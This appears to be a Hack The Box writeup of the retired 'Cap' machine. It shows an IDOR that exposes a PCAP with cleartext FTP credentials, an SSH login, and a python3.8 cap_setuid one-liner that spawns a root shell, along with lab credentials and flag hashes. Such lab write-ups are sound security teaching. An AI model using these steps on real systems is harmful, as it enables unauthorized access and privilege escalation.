---
title: "Cap — HackTheBox Writeup"
date: 2025-09-18
author: "Angus Dawson"
tags: ["HTB", "Linux", "PCAP", "Privilege Escalation", "capabilities"]
categories: ["CTF Writeups"]
difficulty: "Easy"
platform: "Hack The Box"
os: "Linux"
summary: "A web app that leaks another user's traffic capture, and a Linux privilege feature left too permissive. IDOR → PCAP recovery of credentials → SSH user shell → Linux file capabilities (getcap) → root via python3.8 capability."
images: ["/images/cap/cap.webp"]
cover:
  image: "/images/cap/cap.webp"
  alt: "Cap HTB image"
  caption: "Cap - CTF - Hack The Box"
  relative: true
  hidden: false

---

> ⚠️ **Spoiler warning — retired HTB machine.**
> This writeup documents my playthrough of the retired Hack The Box machine **Cap**. VPN IPs shown are HTB-assigned addresses used during the box.

---

## 🔍 Recon

Initial scan:
```bash
nmap -sV -sC -oN initial 10.129.242.125
```
![Nmap scan showing open services](/images/cap/nmap_scan.png)


While enumerating the web application I discovered an IDOR (insecure direct object reference) path under /data:
![Web application dashboard](/images/cap/dashboard.png)


**The data ID in the URL can be changed to reveal something interesting**

```firefox
http://10.129.242.125/data/0
```
Accessing the data endpoint allowed me to download a PCAP file capturing unencrypted FTP traffic.
![IDOR vulnerability](/images/cap/url_id.png)

---

## 🧩 PCAP Analysis & Credentials
I opened the PCAP in Wireshark and inspected the FTP traffic. Credentials were sent in cleartext; I recovered the following valid account:

**Nathan's Credentials**
username: nathan
password: Buck3tH4TF0RM3!
With those credentials I could log into the host as nathan (SSH).
![Wireshark - unencrypted FTP traffic](/images/cap/unencrypted_ftp_creds.png)


---

## 🖥️ Foothold (SSH as nathan)
SSH into the box:

```bash
ssh nathan@10.129.242.125
 enter password: Buck3tH4TF0RM3!
```
![SSH as Nathan](/images/cap/ssh_nathan.png)

**Found the user flag:**

```bash
cat /home/nathan/user.txt
```
"ffebb9968efc6ca3d75c8cd36357cb06"
![User flag](/images/cap/user_flag.png)

---

## 🔐 Privilege Escalation (file capabilities)
Local enumeration for Linux capabilities:

```bash
# list capabilities recursively from root (hide permission denied noise)
getcap -r / 2>/dev/null
```

**Relevant output:**

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

What this means: getcap shows POSIX file capabilities on binaries. The entry for /usr/bin/python3.8 includes cap_setuid, indicating that this binary can change its UID — it can be abused to escalate privileges without needing a password.
![Local enumeration  with getcap](/images/cap/getcap.png)


# Exploit (use with care; this is what I ran on the box):

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
![Privilege escalation](/images/cap/privilege_escalation.png)


**That spawned a root shell:**
```bash
root@cap:~# whoami
root
```
![Gained root access](/images/cap/whoami.png)

---

## 🏁 Root Flag

```bash
cat /root/root.txt
```
"9589c70870530feec969223b4baca6fb"
![Found root flag](/images/cap/root_flag.png)

---

## 🔑 Takeaways

IDORs can expose sensitive artifacts (PCAPs, backups) — always check object enumeration endpoints like `/data/<id>`.

PCAP analysis with Wireshark is invaluable for recovering plaintext credentials when services are unencrypted (FTP/HTTP basic auth).

Linux file capabilities (checked via getcap) often provide escalation paths; cap_setuid on an interpreter (python) is a high-impact finding.

When a binary has cap_setuid, carefully consider executing it to elevate privileges — prefer non-interactive, audited commands if available.

---

## 📚 Resources & Notes

getcap / setcap documentation (man pages)

Wireshark — follow TCP stream for FTP credentials

CAPABILITY reference: Linux capabilities cap_setuid, cap_net_bind_service, etc.
